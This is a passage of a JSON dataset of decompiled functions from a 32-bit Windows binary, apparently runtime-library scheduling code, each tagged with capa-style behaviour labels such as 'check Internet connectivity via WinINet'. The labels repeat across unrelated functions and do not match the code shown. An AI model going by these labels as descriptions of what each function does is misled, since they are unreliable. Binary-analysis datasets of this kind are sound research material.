uVar4;\n                    }\n                    fcn.0043e920(uVar10, uVar5, uVar4, uVar2, var_14h);\n                    var_8h = var_8h - uVar10;\n                    iVar8 = iVar8 - uVar10;\n                    iVar7 = var_10h;\n                }\n                iVar9 = var_8h;\n                if ((iVar8 != 0) && (*(param_1 + 0x20) != 0)) {\n                    iVar7 = fcn.0043dc90(*(param_1 + 0x20), iVar8, iVar7);\n                    uVar2 = fcn.004404f5(var_10h);\n                    fcn.0043ea5f(iVar7, uVar2);\n                    *(param_1 + 0x20) = *(param_1 + 0x20) - iVar7;\n                }\n            }\n        }\n        *(param_1 + 0x24) = *(param_1 + 0x24) + 1;\n        uVar4 = *(param_1 + 0x24);\n    }\n    fcn.004410fc();\n    return;\n}\n",
        "token_count": 1739
    },
    "0043eea8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043eea8(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t arg_10h_00;\n    int32_t *arg_ch_00;\n    char cVar4;\n    uint16_t uVar5;\n    int32_t arg_8h_00;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = *(*(arg_8h + 0x10) + 0x10) + arg_10h * 0x34;\n    uVar3 = *(arg_8h_00 + 0x2c);\n    var_4h = uVar3;\n    if (arg_14h < uVar3) {\n        var_4h = arg_14h;\n    }\n    uVar2 = *(arg_8h_00 + 0x20) - uVar3;\n    uVar7 = arg_14h - var_4h;\n    if (uVar2 <= arg_14h - var_4h) {\n        uVar7 = uVar2;\n    }\n    uVar3 = *(arg_8h_00 + 0x28) - uVar3;\n    uVar2 = (arg_14h - uVar7) - var_4h;\n    if (uVar2 < uVar3) {\n        uVar3 = uVar2;\n    }\n    iVar6 = uVar2 - uVar3;\n    var_ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    uVar2 = var_4h;\n    var_10h = uVar3;\n    do {\n        uVar1 = var_20h;\n        arg_ch_00 = *(arg_8h_00 + 0x30) + var_14h;\n        if ((*arg_ch_00 == 4) && (arg_ch_00[10] == 0)) {\n            uVar5 = *(arg_ch_00 + 0xc);\n            cVar4 = uVar5;\n            if (*(arg_ch_00 + 0x31) == '\\0') {\n                if ((cVar4 == '\\0') || (uVar3 == 0)) {\n                    if (iVar6 == 0) goto code_r0x0043eff5;\n                    iVar6 = iVar6 + -1;\n                }\n                else {\n                    var_10h = uVar3 - 1;\n                }\n            }\n            else if ((cVar4 == '\\0') || (uVar2 == 0)) {\n                if (uVar7 == 0) goto code_r0x0043eff5;\n                uVar7 = uVar7 - 1;\n            }\n            else {\n                var_4h = uVar2 - 1;\n            }\n            arg_10h_00 = arg_10h * 0x28 + *(in_ECX + 0x48);\n            if (cVar4 != '\\0') {\n                fcn.004417d1(arg_8h_00, arg_ch_00, arg_10h_00, *(arg_10h_00 + 0x20) + var_18h, arg_8h);\n                uVar5 = uVar5 & 0xff | *(arg_ch_00 + 0x31) << 8;\n            }\n            var_20h = var_20h & 0xffffff00;\n            if (uVar5 >> 8 == '\\0') {\n                *(arg_8h + 0x30) = *(arg_8h + 0x30) + -1;\n            }\n            else {\n                var_20h = CONCAT31(SUB43(uVar1, 1), 1);\n                if (uVar5 == '\\0') {\n                    *(arg_8h + 0x2c) = *(arg_8h + 0x2c) + -1;\n                }\n                else {\n                    *(arg_8h + 0x28) = *(arg_8h + 0x28) + -1;\n                }\n            }\n            fcn.00448e21(arg_8h_00, var_ch);\n            fcn.004481e2(*(arg_ch + 0x10) + arg_10h * 0x34, var_ch, var_20h);\n            arg_14h = arg_14h - 1;\n            uVar3 = var_10h;\n            uVar2 = var_4h;\n            if (arg_14h == 0) {\n                return;\n            }\n        }\ncode_r0x0043eff5:\n        var_ch = var_ch + 1;\n        var_14h = var_14h + 0x34;\n        var_18h = var_18h + 0x24;\n    } while( true );\n}\n",
        "token_count": 1212
    },
    "004402e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __fastcall fcn.004402e9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t arg_ch;\n    bool bVar6;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    fcn.0043fd7c();\n    arg_ch = *(param_1 + 100);\n    bVar6 = arg_ch == 0;\n    while( true ) {\n        if (bVar6) {\n            arg_ch = 0;\n        }\n        else {\n            arg_ch = *(arg_ch + 0x18);\n        }\n        if (arg_ch == 0) break;\n        fcn.00452000(arg_ch + 0x40, 0, 0x38);\n        fcn.00440221(var_10h, arg_ch, arg_ch + 0x40);\n        if (*(arg_ch + 0xcc) == '\\0') {\n            *(arg_ch + 100) = *(arg_ch + 0xa0);\n        }\n        else {\n            var_4h = *(arg_ch + 0x78);\n            var_ch = 0;\n            var_8h = 0;\n            iVar1 = **(arg_ch + 8);\n            (**0x4742a4)(&fcn.004402e9::var_ch, &fcn.004402e9::var_8h, &fcn.004402e9::var_4h);\n            (**(iVar1 + 4))();\n            param_1 = var_8h;\n            uVar3 = fcn.00447cce(0x44037c, var_ch, var_8h, var_4h);\n            *(arg_ch + 100) = uVar3;\n            if (*(arg_ch + 0xa0) <= uVar3 && uVar3 != *(arg_ch + 0xa0)) {\n                uVar4 = fcn.004483ee(uVar3);\n                *(arg_ch + 100) = uVar4;\n            }\n            *(arg_ch + 0x78) = var_4h;\n        }\n        uVar3 = *(arg_ch + 0xa0);\n        if (uVar3 == 0) {\n            iVar1 = *(arg_ch + 0xc4);\n        }\n        else {\n            iVar1 = *(arg_ch + 0x54);\n        }\n        if (((iVar1 == 0) || (*(arg_ch + 100) <= uVar3 && uVar3 != *(arg_ch + 100))) ||\n           (uVar5 = fcn.0043e381(),  uVar5 <= uVar3)) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 1;\n        }\n        *(arg_ch + 0x61) = uVar2;\n        *(*(param_1 + 0x54) + var_10h * 4) = arg_ch + 0x40;\n        var_10h = var_10h + 1;\n        bVar6 = arg_ch == *(param_1 + 100);\n    }\n    return;\n}\n",
        "token_count": 757
    },
    "004426c9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004426c9(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    \n    arg_8h_00 = fcn.0043d4ec(*0x495804);\n    if (arg_8h_00 != 0) {\n        if (*(arg_8h_00 + 0x1c) == in_ECX) {\n            fcn.004454dd();\n            fcn.00451487(&var_ch, 0x48e3d0);\n            pcVar1 = swi(3);\n            uVar2 = (*pcVar1)();\n            return uVar2;\n        }\n        if (*(arg_8h_00 + 0x4c) == '\\0') {\n            fcn.0044ba5c();\n        }\n        fcn.00445cf0();\n    }\n    fcn.004444c7();\n    uVar2 = fcn.00443339(arg_8h);\n    fcn.00446189(arg_8h_00);\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "004428a5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004428a5(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    *(unaff_EBP + -0x10) = 0x49581c;\n    fcn.0043d853();\n    *(unaff_EBP + -4) = 0;\n    *0x49580c = *0x49580c + 1;\n    if (*0x49580c == 1) {\n        if (*0x495868 == 0) {\n            fcn.004499eb();\n        }\n        if ((*0x4910b4 & 0x80000000) == 0) {\n            fcn.0043cd22();\n            *0x495804 = fcn.0043d49f();\n            fcn.0044e466();\n            LOCK();\n            *0x4910b4 = *0x4910b4 | 0x80000000;\n        }\n    }\n    *0x49581c = 0;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 255
    },
    "004455c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004455c4(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0044576d();\n        fcn.0043a7bc(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00445c22": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00445c22(int32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *arg_ch;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *in_ECX;\n    \n    iVar3 = *(*(*in_ECX + 0xc) + in_ECX[1] * 4);\n    if (iVar3 != 1) {\n        piVar2 = *(*in_ECX + 0xc) + in_ECX[1] * 4;\n        iVar4 = *piVar2;\n        *piVar2 = 1;\n        if (iVar4 == iVar3) {\n            if (arg_8h != NULL) {\n                *arg_8h = iVar3;\n            }\n            return CONCAT31(piVar2 >> 8, 1);\n        }\n    }\n    arg_ch = *in_ECX;\n    LOCK();\n    puVar1 = arg_ch + 5;\n    uVar5 = *puVar1;\n    uVar6 = *puVar1;\n    *puVar1 = uVar5 - 1;\n    if (uVar5 - 1 == 0) {\n        uVar6 = fcn.00443ec6(fcn.0044645b, arg_ch, *arg_ch);\n    }\n    return uVar6 & 0xffffff00;\n}\n",
        "token_count": 327
    },
    "00445ec4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00445ec4(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_19h;\n    \n    if (*(unaff_EBP + -0x19) != '\\0') {\n        fcn.0043cd45();\n    }\n    return *(unaff_EBP + -0x1a);\n}\n",
        "token_count": 73
    },
    "00446707": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00446707(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *extraout_ECX;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = extraout_ECX[1] | 0xfffffff;\n    extraout_ECX[2] = 0;\n    extraout_ECX[4] = 0;\n    extraout_ECX[5] = 0x80000000;\n    extraout_ECX[6] = 0;\n    extraout_ECX[0xe] = 0;\n    fcn.0043b756();\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    extraout_ECX[0x19] = *(iVar3 + 100);\n    extraout_ECX[0x1b] = 0;\n    extraout_ECX[0x1e] = 0;\n    extraout_ECX[0x21] = 0;\n    extraout_ECX[0x22] = 0;\n    if (((*0x4910b4 & 0x80000000) == 0) || (iVar2 = fcn.0043d4ec(*0x495804),  iVar2 == 0)) {\n        iVar2 = fcn.00442b71();\n    }\n    extraout_ECX[3] = iVar2;\n    *extraout_ECX = *(iVar2 + 0x34);\n    iVar3 = *(iVar3 + 8);\n    extraout_ECX[2] = iVar3;\n    if ((iVar3 != 0) && (iVar3 != 2)) {\n        LOCK();\n        *(iVar3 + 4) = *(iVar3 + 4) + 1;\n    }\n    fcn.00447086();\n    fcn.0043c1bf();\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        extraout_ECX[0x1e] = extraout_ECX[0x1e] | 1;\n        extraout_ECX[0x1a] = 0;\n    }\n    else {\n        piVar4 = extraout_ECX[0x19] + 0x68;\n        iVar3 = *piVar4;\n        extraout_ECX[0x1a] = iVar3;\n        LOCK();\n        if (iVar3 == *piVar4) {\n            *piVar4 = extraout_ECX;\n            iVar2 = iVar3;\n        }\n        else {\n            iVar2 = *piVar4;\n        }\n        while (iVar2 != iVar3) {\n            extraout_ECX[0x1a] = iVar2;\n            piVar4 = extraout_ECX[0x19] + 0x68;\n            LOCK();\n            iVar3 = iVar2;\n            if (iVar2 == *piVar4) {\n                *piVar4 = extraout_ECX;\n            }\n            else {\n                iVar2 = *piVar4;\n            }\n        }\n    }\n    iVar2 = fcn.00442d5d();\n    iVar3 = *(iVar2 + 0x20);\n    if (iVar3 == 0) {\n        fcn.00445d00();\n        iVar3 = *(iVar2 + 0x20);\n    }\n    uVar1 = *(iVar3 + 0x40);\n    extraout_ECX[1] = extraout_ECX[1] & 0xfffffff;\n    extraout_ECX[0x20] = uVar1;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 880
    },
    "00446c95": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446c95(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    if (*(param_1 + 0xc) != 0) goto code_r0x00446cc2;\n    if ((*0x4910b4 & 0x80000000) == 0) {\ncode_r0x00446cba:\n        iVar3 = fcn.00442b71();\n    }\n    else {\n        iVar3 = fcn.0043d4ec(*0x495804);\n        if (iVar3 == 0) goto code_r0x00446cba;\n    }\n    *(param_1 + 0xc) = iVar3;\ncode_r0x00446cc2:\n    cVar2 = fcn.0044e50c();\n    if (cVar2 != '\\0') {\n        iVar3 = (*(param_1 + 4) << 4) >> 4;\n        if ((*(param_1 + 4) & 0x8000000) == 0) {\n            fcn.00445a8f(iVar3);\n        }\n        else {\n            LOCK();\n            piVar1 = *(param_1 + 0xc) + 0x78;\n            *piVar1 = *piVar1 + 1;\n            iVar3 = 2;\n        }\n        fcn.0044e4be(iVar3);\n        fcn.00445b26(param_1);\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "00447cce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00447cce(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    double dVar2;\n    double dVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        iVar5 = 0;\n    }\n    else {\n        *(in_ECX + 0x824) = *(in_ECX + 0x824) + 1;\n        fcn.00447b08(arg_8h);\n        iVar6 = *(in_ECX + 0x828);\n        if (iVar6 != 0) {\n            arg_ch = arg_ch + *(in_ECX + 0x82c);\n            arg_10h = arg_10h + *(in_ECX + 0x830);\n        }\n        if ((arg_ch < arg_8h) && (arg_ch < arg_14h)) {\n            arg_10h = arg_10h + (arg_8h - arg_ch);\n            arg_ch = arg_8h;\n        }\n        if ((((*(in_ECX + 0x820) == 0) || (arg_ch != 0)) || (arg_10h != 0)) || (arg_14h != 0)) {\n            uVar1 = *(in_ECX + 0x820) + 1;\n            dVar2 = arg_ch;\n            *(in_ECX + 0x820) = uVar1;\n            *(in_ECX + 0x82c) = 0;\n            *(in_ECX + 0x830) = 0;\n            *(in_ECX + 0x828) = 0;\n            iVar5 = *(in_ECX + 0x814);\n            if (arg_ch < 0) {\n                dVar2 = dVar2 + *0x4783e0;\n            }\n            dVar3 = iVar6 + 1;\n            if (iVar6 + 1 < 0) {\n                dVar3 = dVar3 + *0x4783e0;\n            }\n            dVar3 = (dVar2 * *0x474510) / dVar3;\n            if (uVar1 < 2) {\n                *(in_ECX + 0x818) = iVar5;\n            }\n            else {\n                iVar6 = fcn.00447b93(iVar5);\n                iVar7 = fcn.00447b93(*(in_ECX + 0x818));\n                fcn.004479b6(SUB84(dVar3, 0), dVar3 >> 0x20, *(in_ECX + 0x824));\n                if ((*(iVar7 + 0x10) == 0) || (iVar6 == iVar7)) {\n                    cVar4 = fcn.00447bd7(iVar6);\n                    if (cVar4 == '\\0') {\n                        return iVar5;\n                    }\n                    iVar5 = fcn.00447bbe();\n                    iVar5 = iVar5 + *(in_ECX + 0x814);\n                }\n                else {\n                    cVar4 = fcn.00447bd7(iVar6);\n                    if (cVar4 == '\\0') {\n                        return iVar5;\n                    }\n                    fcn.004479d9(*(in_ECX + 0x818), *(in_ECX + 0x814));\n                    iVar6 = *(in_ECX + 0x814);\n                    iVar5 = fcn.0046f900();\n                    if (iVar5 == iVar6) {\n                        iVar5 = fcn.0046f900();\n                    }\n                }\n                iVar5 = fcn.00447c07(iVar5);\n            }\n        }\n        else {\n            iVar7 = *(in_ECX + 0x800);\n            *(in_ECX + 0x830) = 0;\n            *(in_ECX + 0x828) = iVar6 + 1U;\n            *(in_ECX + 0x82c) = 0;\n            iVar5 = fcn.004400b0();\n            iVar5 = iVar5 + *(iVar7 + 0xb8);\n            if (iVar6 + 1U < 3) {\n                iVar5 = *(in_ECX + 0x814);\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 993
    },
    "00448d3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00448d3e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    uint uVar5;\n    uint var_4h;\n    \n    arg_8h = fcn.0043d4ec(*(*(param_1 + 0xc) + 0x70));\n    if (arg_8h == 0) {\n        return 0;\n    }\n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 3) != 1) {\n            piVar1 = (arg_8h & 0xfffffffd) + 4;\n            pcVar3 = *(*piVar1 + 0x10);\n            (**0x4742a4)();\n            (*pcVar3)();\n            iVar2 = *((arg_8h & 0xfffffffd) + 0x20);\n            iVar4 = *(iVar2 + 0x2c);\n            arg_8h = iVar2 + 0x10;\n            if ((iVar4 == 0) || (*(iVar4 + 0x44) == '\\0')) {\n                fcn.004477bd();\n            }\n            else {\n                arg_8h = 0;\n            }\n            pcVar3 = *(*piVar1 + 0x14);\n            (**0x4742a4)();\n            (*pcVar3)();\n            goto code_r0x00448dd5;\n        }\n        iVar2 = *((arg_8h & 0xfffffffe) + 0x10);\n        arg_8h = iVar2 + 8;\n        iVar2 = *(iVar2 + 0x24);\n        if ((iVar2 != 0) && (*(iVar2 + 0x44) != '\\0')) {\n            return 0;\n        }\n    }\n    fcn.004477bd();\ncode_r0x00448dd5:\n    if (arg_8h == 0) {\n        return 0;\n    }\n    uVar5 = fcn.0044893d(arg_8h);\n    return uVar5;\n}\n",
        "token_count": 483
    },
    "00448f4a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00448f4a(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x30);\n    *(unaff_EBP + -0x3c) = extraout_ECX;\n    iVar5 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x34) = iVar5;\n    *(unaff_EBP + -0x38) = extraout_ECX + 0x20;\n    fcn.0043cbf1();\n    *(unaff_EBP + -4) = 0;\n    iVar8 = 0;\n    uVar1 = *(iVar5 + 0xc);\n    if (uVar1 < 9) {\n        iVar5 = unaff_EBP + -0x30;\n    }\n    else {\n        iVar4 = uVar1 * 4;\n        iVar5 = fcn.0046f837(-(iVar4 >> 0x20 != 0) | iVar4);\n    }\n    iVar6 = *(*(unaff_EBP + -0x34) + 0x10);\n    if (iVar6 == 0) {\n        iVar6 = 0;\n    }\n    else {\n        iVar6 = *(iVar6 + 0x38);\n    }\n    if (iVar6 != 0) {\n        iVar2 = *(unaff_EBP + -0x34);\n        do {\n            if (iVar6 == *(iVar2 + 0x10)) {\n                iVar7 = 0;\n            }\n            else {\n                iVar7 = *(iVar6 + 0x38);\n            }\n            iVar6 = *(iVar6 + 0x1c);\n            if ((iVar6 != 0) && (*(iVar6 + 0x44) == '\\0')) {\n                *(iVar5 + iVar8 * 4) = iVar6;\n                iVar8 = iVar8 + 1;\n            }\n            iVar6 = iVar7;\n        } while (iVar7 != 0);\n    }\n    piVar3 = *(*(unaff_EBP + -0x3c) + 8);\n    *(unaff_EBP + -0x34) = piVar3;\n    iVar6 = *piVar3;\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        pcVar9 = *(iVar6 + 0x14);\n    }\n    else {\n        pcVar9 = *(iVar6 + 0x18);\n    }\n    (**0x4742a4)(iVar5, iVar8);\n    (*pcVar9)();\n    *(unaff_EBP + -4) = 1;\n    fcn.0043cd39();\n    if (iVar5 != unaff_EBP + -0x30) {\n        fcn.0043ac97(iVar5);\n    }\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 759
    },
    "004493ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004493ba(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    uint var_4h;\n    \n    if (*0x495848 == 0) {\n        *0x495848 = fcn.0043f949();\n        *0x495848 = *0x495848 << 2;\n    }\n    iVar1 = fcn.0043a4f7(0x30, in_ECX);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0044921b(arg_8h);\n    }\n    return uVar2;\n}\n",
        "token_count": 176
    },
    "00449b9b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449b9b(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.Concurrency::details::VirtualProcessor.0;\n    if (param_1[0x17] != NULL) {\n        fcn.00444b58(param_1[0x17]);\n        param_1[0x17] = NULL;\n    }\n    fcn.0043ac97(param_1[0x2a], uVar1);\n    fcn.0043ac97(param_1[7]);\n    fcn.0043ac97(param_1[8]);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 238
    },
    "0044b69a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044b69a(uchar *arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_8h = 0;\n    pcVar1 = *(*(in_ECX + 0xa0) + 0x48);\n    var_4h = in_ECX;\n    (**0x4742a4)(&var_10h, *(in_ECX + 0x1c), 0, 0x19);\n    cVar2 = (*pcVar1)();\n    if (cVar2 == '\\0') {\n        iVar3 = fcn.00443399(1);\n        *arg_8h = iVar3 != 0;\n        return iVar3;\n    }\n    if (var_10h == 1) {\n        return var_8h;\n    }\n    fcn.00430fbc();\n    iVar3 = fcn.00443399(1);\n    fcn.00430fbc();\n    if (iVar3 == 0) {\n        pcVar1 = *(*(var_4h + 0xa0) + 0x48);\n        (**0x4742a4)(&var_10h, *(var_4h + 0x1c), 0, 1);\n        cVar2 = (*pcVar1)();\n        if (cVar2 == '\\0') {\n            return 0;\n        }\ncode_r0x0044b764:\n        iVar3 = fcn.0044f762();\n    }\n    else {\n        cVar2 = fcn.0044fd72();\n        if (cVar2 == '\\0') {\n            pcVar1 = *(*(var_4h + 0xa0) + 0x48);\n            (**0x4742a4)(&var_10h, *(var_4h + 0x1c), 0, 7);\n            cVar2 = (*pcVar1)();\n            if (cVar2 == '\\0') {\n                *arg_8h = 1;\n                return iVar3;\n            }\n            if (var_10h == 1) {\n                fcn.00444603(iVar3, 1);\n                goto code_r0x0044b764;\n            }\n        }\n        *arg_ch = var_10h == 4;\n        fcn.0044f7af(iVar3);\n    }\n    return iVar3;\n}\n",
        "token_count": 586
    },
    "0044ba5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044ba5c(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    fcn.00430fbc();\n    var_2h._1_1_ = '\\0';\n    var_2h._0_1_ = 0;\n    iVar4 = fcn.0044b69a(&var_2h + 1, &var_2h);\n    if (var_2h._1_1_ != '\\0') {\n        fcn.0044bbec(*(param_1 + 0x1c), 0, 0);\n    }\n    fcn.00430fbc();\n    piVar1 = *(param_1 + 0xa0);\n    *(param_1 + 0xa0) = 0;\n    piVar2 = *(param_1 + 0x9c);\n    var_ch = iVar4;\n    if (iVar4 == 0) {\n        pcVar3 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        var_ch = (*pcVar3)();\n    }\n    *(param_1 + 0x2c) = 1;\n    pcVar3 = *(*piVar1 + 0x10);\n    (**0x4742a4)(iVar4);\n    (*pcVar3)();\n    if (var_ch == 0) {\n        fcn.0044a119(4, 1);\n        fcn.00442c08();\n        pcVar3 = *(*piVar2 + 8);\n        